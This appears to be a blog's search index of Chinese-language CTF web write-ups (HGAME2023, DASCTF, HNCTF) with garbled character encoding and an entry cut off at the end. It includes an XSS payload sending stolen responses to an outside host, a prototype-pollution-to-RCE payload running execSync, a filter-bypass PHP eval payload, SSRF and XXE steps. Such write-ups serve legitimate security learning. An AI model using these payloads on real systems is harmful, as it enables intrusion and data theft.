<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HGAME2023 wp</title>
      <link href="/2023/02/06/HGAME2023-wp/"/>
      <url>/2023/02/06/HGAME2023-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h2><blockquote><p>é¢˜ç›®æè¿°ï¼šè¯·å°è¯•è·å–Adminç”¨æˆ·çš„è®¢é˜…é“¾æ¥ï¼Œflagæ ¼å¼ä¸ºhgame{adminç”¨æˆ·è®¢é˜…é“¾æ¥ä¸­çš„tokenå€¼}ã€‚</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206224428482.png" alt="image-20230206224428482"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206223941914.png" alt="image-20230206223941914"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206223924045.png" alt="image-20230206223924045"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206224312727.png" alt="image-20230206224312727"></p><h2 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h2><p>xssæ³¨å…¥çš„é¢˜</p><p>é¦–å…ˆè¦æ‹¿åˆ°flagå°±è¦æ±‚æ³¨å†Œçš„æ—¶å€™postçš„æ•°æ®ä¸ºadminï¼Œè€Œä¸”è¿˜è¦æ˜¯æœ¬åœ°çš„ipï¼Œä¿®æ”¹xffæ— æœ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003404602.png" alt="image-20230207003404602"></p><p>ç»™çš„æºç é‡Œçš„shareçš„éƒ¨åˆ†ï¼Œå°±æ˜¯åœ¨æœ¬åœ°è®¿é—®previewè¿™ä¸ªè·¯ç”±é‡Œçš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003324707.png" alt="image-20230207003324707"></p><p>ä¹‹ååœ¨previewé‡Œï¼Œè¿‡æ»¤äº†ä¸€äº›xssçš„å…³é”®æ•°æ®ï¼Œä»è¿™é‡Œä¹Ÿèƒ½çœ‹å‡ºè¿™é“é¢˜å°±æ˜¯åˆ©ç”¨xssï¼Œè®©æœ¬åœ°è®¿é—®çš„é‚£ä¸ªæœºå™¨äººå»è®¿é—®registerè·¯ç”±ï¼Œç„¶åæŠŠå¾—åˆ°çš„å†…å®¹å¤–å¸¦å‡ºæ¥ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003512737.png" alt="image-20230207003512737"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾ä»å“ªé‡Œè¿›è¡Œxssã€‚</p><p>åœ¨preview.ejsä¸­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003646161.png" alt="image-20230207003646161"></p><p>ä½¿ç”¨äº†&lt;%-ï¼Œè¿™ä¸ªå’Œ&lt;%=çš„åŒºåˆ«å°±æ˜¯ä¸ä¼šè¿›è¡Œhtmlçš„å®ä½“ç¼–ç ï¼Œä¹Ÿå°±å¯ä»¥è¿›è¡Œxssçš„æ“ä½œ</p><p>è¿™é‡Œè¿›è¡Œè¿‡æ»¤çš„æ—¶å€™åªå°†å€¼æ¸…ç©ºäº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹å˜é”®ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·è¿›è¡Œxss</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003945121.png" alt="image-20230207003945121"></p><p>æ¥ä¸‹æ¥å°±æ˜¯è®©å…¶è®¿é—®registerè·¯ç”±äº†</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"post"</span><span class="token punctuation">,</span><span class="token string">'http://127.0.0.1:9090/user/register'</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>h <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>url <span class="token operator">=</span> <span class="token string">"http://xxx:5001?token="</span><span class="token operator">+</span>h<span class="token punctuation">;</span><span class="token keyword">var</span> xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr2<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr2<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ”¾åˆ°æœåŠ¡å™¨ä¸Šç„¶åè®©é¢˜ç›®æœ¬åœ°çš„æœºå™¨äººå»è®¿é—®æœåŠ¡å™¨ä¸Šçš„è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šæ‰§è¡Œé‡Œé¢çš„jsä»£ç ï¼Œè®¿é—®æœ¬åœ°çš„9090ç«¯å£ä¸‹çš„/user/registerï¼Œç„¶åæŠŠè¿”å›çš„å†…å®¹ä»¥å‚æ•°çš„å½¢å¼å‘é€åˆ°æœåŠ¡å™¨ä¸Š</p><p>ä½œä¸ºé”®æˆ–è€…ä½œä¸ºå€¼éƒ½è¡Œï¼Œå› ä¸ºå¹¶æ²¡æœ‰è¢«è¿‡æ»¤çš„å…³é”®å­—</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207004326111.png" alt="image-20230207004326111"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207002949668.png" alt="image-20230207002949668"></p><h2 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h2><blockquote><p>é¢˜ç›®æè¿°:ä»Šå¤©æ˜¯å¤§å¹´åˆäºŒï¼å…”å…”è¿ˆç€å¼€å¿ƒçš„æ­¥ä¼èµ°åˆ°äº†ä¸€æ•™ï¼Œæ®è¯´æ¯é€¢å¯’å‡HGAMEæœŸé—´ï¼Œ300bå°±ä¼šæœ‰Vidarå¤§å•†åœºï¼Œæ¯ä¸ªè¿›å…¥å•†åœºçš„åŒå­¦éƒ½å¯ä»¥é¢†å–10ä¸ªVidarå¸ã€‚å…”å…”åœ¨ä¸€å®¶å«Gopher Shopçš„å•†åº—é¢å‰åœä¸‹äº†è„šæ­¥ï¼ŒGopherï¼Ÿå¬è¯´åä¼šçš„Webæ‰‹ä»¬éƒ½ä¼šä¸€ç‚¹Go,ä¹Ÿè®¸è¿™æ˜¯åä¼šå­¦é•¿å¼€çš„å§ã€‚æœ›ç€æ©±çª—é‡Œçš„å•†å“ï¼Œæ”¥ç€æ‰‹é‡Œçš„10ä¸ªVidarå¸ï¼Œå…”å…”èµ°è¿›äº†å•†åº—...</p></blockquote><p>è€ƒå¯Ÿgoè¯­è¨€uintç±»å‹çš„æ•´æ•°æº¢å‡ºé—®é¢˜</p><p> uintç±»å‹åœ¨64ä½æœºå™¨ä¸Šçš„æœ€å¤§å€¼ä¸º18446744073709551615ï¼Œæœ€å°å€¼ä¸º0ï¼Œè¶…å‡ºçš„éƒ¨åˆ†å°±ä¼šæº¢å‡º</p><p>è´­ä¹°éƒ¨åˆ†é€»è¾‘å¦‚ä¸‹ï¼š</p><p> <img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207163300926.png" alt="image-20230207163300926"></p><p>è¿™é‡Œuint(number)*priceå°±æœ‰å¯èƒ½å¯¼è‡´æº¢å‡ºçš„äº§ç”Ÿ</p><p>è‹¥è´­ä¹°1844674407370955162ä¸ªè‹¹æœï¼Œä¸ä»·æ ¼ç›¸ä¹˜åä¼šå˜ä¸º18446744073709551620ï¼Œå¯¼è‡´æº¢å‡ºå˜ä¸º4ï¼ˆ0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4å®é™…ä¸Šæ˜¯æº¢å‡ºäº†äº”ï¼‰</p><p>è¿™æ—¶4å°äºæˆ‘ä»¬åŸæœ‰çš„10ç¡¬å¸ï¼Œå°±å¯ä»¥ä¹°åˆ°1844674407370955162ä¸ªè‹¹æœï¼Œç„¶åå†å–å‡ºå°±å¯ä»¥æœ‰é’±ä¹°flagäº†ï¼ˆå–çš„æ—¶å€™ä¹Ÿè¦æ³¨æ„æº¢å‡º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207164534678.png" alt="image-20230207164534678"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207164611751.png" alt="image-20230207164611751"></p><p>é’±ä¸å¤Ÿå°±å¤šä¹°å‡ æ¬¡å†å–å‡ºå»ï¼Œè¿™é‡Œå‰ç«¯æ˜¾ç¤ºçš„å†…å®¹å’Œå®é™…çš„æ•°é‡ä¸ä¸€æ ·ï¼Œå› ä¸ºå‰ç«¯æŠŠåè¾¹çš„éƒ¨åˆ†èˆäº†ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207165210688.png" alt="image-20230207165210688"></p><h2 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h2><blockquote><p>Just tell me your thoughts</p></blockquote><p>xxeçš„é¢˜ç›®</p><p>æ ‡å‡†çš„æ— å›æ˜¾xxe</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207213715388.png" alt="image-20230207213715388"></p><p>åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ­ä¸ªæ¶æ„çš„dtdæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207213808758.png" alt="image-20230207213808758"></p><p>ç„¶ååœ¨æäº¤çš„æ—¶å€™å¤–éƒ¨å¼•å…¥è¿™ä¸ªæ–‡ä»¶</p><p>è¿™é‡Œæ˜¯ç›´æ¥æŠ¥é”™æŠŠæäº¤çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œå¦‚æœæ²¡æ˜¾ç¤ºå°±åœ¨æœåŠ¡å™¨ä¸Šç›‘å¬ä¸€ä¸‹ç«¯å£å°±è¡Œã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207213928767.png" alt="image-20230207213928767"></p><h2 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h2><blockquote><p>ek1ngç»™åä¼šæˆå‘˜å†™äº†ä¸€ä¸ªåœ¨çº¿å…±äº«æ—¥è®°æœ¬ï¼Œä¸è®ºæ˜¯è°åªè¦çŸ¥é“å¯†ç ï¼Œéƒ½å¯ä»¥åœ¨ä¸Šé¢è®°å½•è‡ªå·±çš„å°ç§˜å¯†ã€‚ä¸è¿‡å¥½åƒä»–çš„jså­¦çš„å¹¶ä¸å¥½å¯¼è‡´æ— æ„ä¸­å¼•å…¥äº†æ¼æ´ï¼Œçœ‹æ¥jsä¹Ÿæœ‰å¾ˆå¤šå®‰å…¨é—®é¢˜ã€‚</p></blockquote><p>çœ‹è§jsç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å°±åº”è¯¥æ˜¯åŸå‹é“¾æ±¡æŸ“</p><p>mergeå‡½æ•°ï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207214312053.png" alt="image-20230207214312053"></p><p>ä½†æ˜¯è¿™é‡Œ__proto__è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨.constructor.prototypeæ¥æ›¿ä»£</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207214501527.png" alt="image-20230207214501527"></p><p>è¿™é‡Œè¡¨ç¤ºèƒ½æ¥æ”¶jsonç±»å‹çš„å‚æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207215143916.png" alt="image-20230207215143916"></p><p>è¿™é‡Œæˆ‘ä»¬å…ˆæŠŠè§’è‰²æ±¡æŸ“ä¸ºadminè¯•ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207215536438.png" alt="image-20230207215536438"></p><p>ç™»é™†æˆåŠŸï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰flagï¼Œæ ¹æ®ç»™çš„æºç å¯ä»¥çŒœæµ‹è¿™é‡Œåº”è¯¥è¿˜éœ€è¦åˆ©ç”¨ä¸€ä¸ªejsçš„æ¼æ´æ‰èƒ½æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207215730542.png" alt="image-20230207215730542"></p><p>ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ejsçš„æ¨¡æ¿æ³¨å…¥ï¼Œå¯ä»¥æ’â¼Š &lt;%- %&gt; æ ‡ç­¾æ¥æ‰§â¾ä»»æ„jsï¼Œèƒ½å¤Ÿç›´æ¥å®ŒæˆRCEã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207221140659.png" alt="image-20230207221140659"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207220748847.png" alt="image-20230207220748847"></p><p>è¿˜æœ‰ä¸€ç§å°±æ˜¯å€ŸåŠ©åŸå‹é“¾æ±¡æŸ“å®ç°ejsçš„rce</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;,&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);&quot;&#125;&#125;,&quot;username&quot;:&quot;1&quot;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207224728259.png" alt="image-20230207224728259"><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207224746850.png" alt="image-20230207224746850"></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.anquanke.com/post/id/236354">https://www.anquanke.com/post/id/236354</a></p><p><a href="https://blog.vvbbnn00.cn/archives/hgame2023week4-bu-fen-writeup">https://blog.vvbbnn00.cn/archives/hgame2023week4-bu-fen-writeup</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF wp</title>
      <link href="/2022/11/11/DASCTFxGFCTF%20wp/"/>
      <url>/2022/11/11/DASCTFxGFCTF%20wp/</url>
      
        <content type="html"><![CDATA[<h2 id="hade-waibo"><a href="#hade-waibo" class="headerlink" title="hade_waibo"></a>hade_waibo</h2><p>éé¢„æœŸå°±æ˜¯å…ˆè¯»start.shæ–‡ä»¶ï¼Œæ‰¾åˆ°flagä½ç½®åè¯»flagæ–‡ä»¶</p><p><strong>é¢„æœŸè§£</strong></p><pre class="language-php" data-language="php"><code class="language-php">#index.php&lt;?phperror_reporting(0);session_start();include &#39;class.php&#39;;if(isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;]!&#x3D;&#39;&#39;)&#123;#ä¿®å¤äº†ç™»å½•è¿˜éœ€è¦passwdçš„æ¼æ´$user &#x3D; new User($_POST[&#39;username&#39;]);&#125;if($_SESSION[&#39;isLogin&#39;])&#123;die(&quot;&lt;script&gt;alert(&#39;Login success!&#39;);location.href&#x3D;&#39;file.php&#39;&lt;&#x2F;script&gt;&quot;);&#125;else&#123;die(&#39;&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot;&gt;&lt;div class&#x3D;&quot;ui input&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;Give me uname&quot; maxlength&#x3D;&quot;6&quot;&gt;&lt;&#x2F;div&gt;&lt;form&gt;&#39;);&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">#class.php&lt;?phpclass User&#123;    public $username;    public function __construct($username)&#123;        $this-&gt;username &#x3D; $username;        $_SESSION[&#39;isLogin&#39;] &#x3D; True;        $_SESSION[&#39;username&#39;] &#x3D; $username;    &#125;    public function __wakeup()&#123;        $cklen &#x3D; strlen($_SESSION[&quot;username&quot;]);        if ($cklen !&#x3D; 0 and $cklen &lt;&#x3D; 6) &#123;            $this-&gt;username &#x3D; $_SESSION[&quot;username&quot;];        &#125;    &#125;    public function __destruct()&#123;        if ($this-&gt;username &#x3D;&#x3D; &#39;&#39;) &#123;            session_destroy();        &#125;    &#125;&#125;class File&#123;    #æ›´æ–°é»‘åå•ä¸ºç™½åå•ï¼Œæ›´åŠ çš„å®‰å…¨    public $white &#x3D; array(&quot;jpg&quot;,&quot;png&quot;);    public function show($filename)&#123;        echo &#39;&lt;div class&#x3D;&quot;ui action input&quot;&gt;&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;filename&quot; placeholder&#x3D;&quot;Search...&quot;&gt;&lt;button class&#x3D;&quot;ui button&quot; onclick&#x3D;&quot;window.location.href&#x3D;\&#39;file.php?m&#x3D;show&amp;filename&#x3D;\&#39;+document.getElementById(\&#39;filename\&#39;).value&quot;&gt;Search&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;p&gt;&#39;;        if(empty($filename))&#123;die();&#125;        return &#39;&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,&#39;.base64_encode(file_get_contents($filename)).&#39;&quot; &#x2F;&gt;&#39;;    &#125;    public function upload($type)&#123;        $filename &#x3D; &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload&#x2F;&quot; . $filename);        return &quot;Upload success! Path: upload&#x2F;&quot; . $filename;    &#125;    public function rmfile()&#123;        system(&#39;rm -rf &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;*&#39;);    &#125;    public function check($type)&#123;        if (!in_array($type,$this-&gt;white))&#123;            return false;        &#125;        return true;    &#125;&#125;#æ›´æ–°äº†ä¸€ä¸ªæ¶æ„åˆæœ‰è¶£çš„Testç±»class Test&#123;    public $value;    public function __destruct()&#123;        chdir(&#39;.&#x2F;upload&#39;);        $this-&gt;backdoor();    &#125;    public function __wakeup()&#123;        $this-&gt;value &#x3D; &quot;Don&#39;t make dream.Wake up plz!&quot;;    &#125;    public function __toString()&#123;        $file &#x3D; substr($_GET[&#39;file&#39;],0,3);        file_put_contents($file, &quot;Hack by $file !&quot;);        return &#39;Unreachable! :)&#39;;    &#125;    public function backdoor()&#123;        if(preg_match(&#39;&#x2F;[A-Za-z0-9?$@]+&#x2F;&#39;, $this-&gt;value))&#123;            $this-&gt;value &#x3D; &#39;nono~&#39;;        &#125;        system($this-&gt;value);    &#125;&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">#file.php&lt;?phperror_reporting(0);session_start();include &#39;class.php&#39;;$file &#x3D; new file();switch ($_GET[&#39;m&#39;]) &#123;case &#39;upload&#39;:if(empty($_FILES))&#123;die($form);&#125;$type &#x3D; end(explode(&quot;.&quot;, $_FILES[&#39;file&#39;][&#39;name&#39;]));if ($file-&gt;check($type)) &#123;die($file-&gt;upload($type));&#125;else&#123;die(&#39;ä½ é£Ÿä¸é£Ÿæ²¹é¥¼ğŸ¤¬&#39;);&#125;break;case &#39;show&#39;:die($file-&gt;show($_GET[&#39;filename&#39;]));break;case &#39;rm&#39;:$file-&gt;rmfile();die(&quot;å…¨åˆ å¹²å‡€äº†æğŸ˜‹&quot;);break;case &#39;logout&#39;:session_destroy();die(&quot;&lt;script&gt;alert(&#39;å·²é€€å‡ºç™»å½•&#39;);location.href&#x3D;&#39;index.php&#39;&lt;&#x2F;script&gt;&quot;);break;default:echo &#39;&lt;h2&gt;Halo! &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;&#x2F;h2&gt;&#39;;break;&#125;?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›webé¢˜</title>
      <link href="/2022/10/20/%E4%B8%80%E4%BA%9Bweb%E9%A2%98/"/>
      <url>/2022/10/20/%E4%B8%80%E4%BA%9Bweb%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-1"><a href="#NSSRound-1" class="headerlink" title="NSSRound#1"></a>NSSRound#1</h1><h2 id="basic-check"><a href="#basic-check" class="headerlink" title="basic_check"></a>basic_check</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020125928977.png" alt="image-20221020125928977"></p><p>æ‰“å¼€ä¹‹ååªæœ‰ä¸€è¡Œä»£ç ï¼Œè¿™é‡Œéœ€è¦ç”¨niktoæ‰«ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">Niktoæ˜¯ä¸€æ¬¾å¼€æ”¾æºä»£ç çš„ã€åŠŸèƒ½å¼ºå¤§çš„WEBæ‰«æè¯„ä¼°è½¯ä»¶ï¼Œèƒ½å¯¹webæœåŠ¡å™¨å¤šç§å®‰å…¨é¡¹ç›®è¿›è¡Œæµ‹è¯•çš„æ‰«æè½¯ä»¶ï¼Œèƒ½åœ¨230å¤šç§æœåŠ¡å™¨ä¸Šæ‰«æå‡º2600å¤šç§æœ‰æ½œåœ¨å±é™©çš„æ–‡ä»¶ã€CGIåŠå…¶ä»–é—®é¢˜ï¼Œå®ƒå¯ä»¥æ‰«ææŒ‡å®šä¸»æœºçš„WEBç±»å‹ã€ä¸»æœºåã€ç‰¹å®šç›®å½•ã€COOKIEã€ç‰¹å®šCGIæ¼æ´ã€è¿”å›ä¸»æœºå…è®¸çš„httpæ¨¡å¼ç­‰ç­‰ã€‚å®ƒä¹Ÿä½¿ç”¨LibWhiskeåº“ï¼Œä½†é€šå¸¸æ¯”Whiskeræ›´æ–°çš„æ›´ä¸ºé¢‘ç¹ã€‚Niktoæ˜¯ç½‘ç®¡å®‰å…¨äººå‘˜å¿…å¤‡çš„WEBå®¡è®¡å·¥å…·ä¹‹ä¸€ã€‚</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020130901005.png" alt="image-20221020130901005"></p><p>æ˜¾ç¤ºå¯ä»¥é€šè¿‡putç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œç›´æ¥å†™é©¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020131504539.png" alt="image-20221020131504539"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020131544382.png" alt="image-20221020131544382"></p><h1 id="HNCTF"><a href="#HNCTF" class="headerlink" title="HNCTF"></a>HNCTF</h1><h2 id="Week1-Challenge-rce"><a href="#Week1-Challenge-rce" class="headerlink" title="[Week1]Challenge__rce"></a>[Week1]Challenge__rce</h2><p>è‡ªå¢çš„rceï¼Œä½†æ˜¯æœ‰ä¸€äº›ç‰¹åˆ«çš„å§¿åŠ¿</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;hint&#39;])) &#123;    highlight_file(__FILE__);&#125;if (isset($_POST[&#39;rce&#39;])) &#123;    $rce &#x3D; $_POST[&#39;rce&#39;];    if (strlen($rce) &lt;&#x3D; 120) &#123;        if (is_string($rce)) &#123;            if (!preg_match(&quot;&#x2F;[!@#%^&amp;*:&#39;\-&lt;?&gt;\&quot;\&#x2F;|&#96;a-zA-Z~\\\\]&#x2F;&quot;, $rce)) &#123;                eval($rce);            &#125; else &#123;                echo(&quot;Are you hack me?&quot;);            &#125;        &#125; else &#123;            echo &quot;I want string!&quot;;        &#125;    &#125; else &#123;        echo &quot;too long!&quot;;    &#125;&#125;</code></pre><p>è¿‡æ»¤äº†å¾ˆå¤šï¼Œåªèƒ½ç”¨ <code>$ _ () [] &#123;&#125; , . = + ;</code> å’Œæ•°å­— 0-9 ä»¥åŠå…¶å®ƒé A-Z a-iz çš„ Unicode å­—ç¬¦ã€‚ä½†æ˜¯å¦‚æœå‚è€ƒpç‰›åšå®¢é‡Œçš„è‡ªå¢rceå§¿åŠ¿çš„è¯é•¿åº¦åˆä¼šè¶…å‡ºé™åˆ¶ã€‚é¢˜ç›®çš„ hint <code>çµæ„Ÿæ¥æºäº ctfshow ä¸ƒå¤•æ¯çš„ shellme_revenge</code>, é‚£é¢˜ç”¨çš„æ˜¯ php<code>0/0=NANå’Œ1/0=INF</code> çš„ç‰¹æ€§ï¼Œä½†æ˜¯éœ€è¦ <code>/</code> è¿ç®—ç¬¦å‚ä¸ã€‚è€Œè¿™é“é¢˜é‡Œæ˜¯é€šè¿‡æ„é€ chrå‡½æ•°ï¼Œç„¶åå†åˆ©ç”¨chræ¥æ„é€ $_GETï¼Œchrçš„æ¯ä¸ªå­—æ¯éƒ½å¯ä»¥é€šè¿‡æ•°ç»„ç±»å‹Arrayå–å‡ºæ¥ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">$_&#x3D;([].Â¥)&#123;3&#125;;$_++;$_.&#x3D;++$_;$_++;$_++;$_++; $_++;$_++;$_.&#x3D;([].Â¥)&#123;2&#125;;$_&#x3D;_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031204900971.png" alt="image-20221031204900971"></p><h2 id="WEEK2-ez-ssrf"><a href="#WEEK2-ez-ssrf" class="headerlink" title="[WEEK2]ez_ssrf"></a>[WEEK2]ez_ssrf</h2><p>flagåœ¨flag.phpä¸‹ï¼Œè¦æ±‚æœ¬åœ°ç™»å½•ï¼Œè¿™é‡Œä¸æ˜¯ä¿®æ”¹xffå’Œrefererå¤´å¯ä»¥å®ç°çš„ï¼Œçœ‹index.phpé‡Œçš„ä»£ç å°±èƒ½çŒœåˆ°æ˜¯å…³äºssrfçš„é¢˜ã€‚çœ‹åˆ°fsockopenå‡½æ•°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æ§åˆ¶ipï¼Œportå’Œdataï¼Œæ‰€ä»¥åªè¦å°†ipè®¾ç½®ä¸º127.0.0.1ï¼Œport=80ï¼Œdataä¸ºæˆ‘ä»¬æ„é€ çš„httpè¯·æ±‚åŒ…ï¼Œå°±å¯ä»¥å®ç°æœ¬åœ°ç™»å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031205410187.png" alt="image-20221031205410187"></p><p>ç¼–ç ä¹‹åæäº¤</p><pre class="language-txt" data-language="txt"><code class="language-txt">host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo%3d</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031205549928.png" alt="image-20221031205549928"></p><h2 id="WEEK2-easy-unser"><a href="#WEEK2-easy-unser" class="headerlink" title="[WEEK2]easy_unser"></a>[WEEK2]easy_unser</h2><p>æ²¡å•¥å¥½å†™çš„ï¼Œå°±è®°ä½<strong>is_fileä¸å°†ä¼ªåè®®å½“ä½œæ–‡ä»¶ï¼Œä½†highlight_fileè®¤ä¸ºä¼ªåè®®å¯ä»¥æ˜¯æ–‡ä»¶</strong>å°±è¡Œäº†</p><h2 id="WEEK2-Ohmywordpress"><a href="#WEEK2-Ohmywordpress" class="headerlink" title="[WEEK2]Ohmywordpress"></a>[WEEK2]Ohmywordpress</h2><p>wordpressè¿™é‡Œæœ‰ä¸¤ä¸ªæ’ä»¶</p><p><img 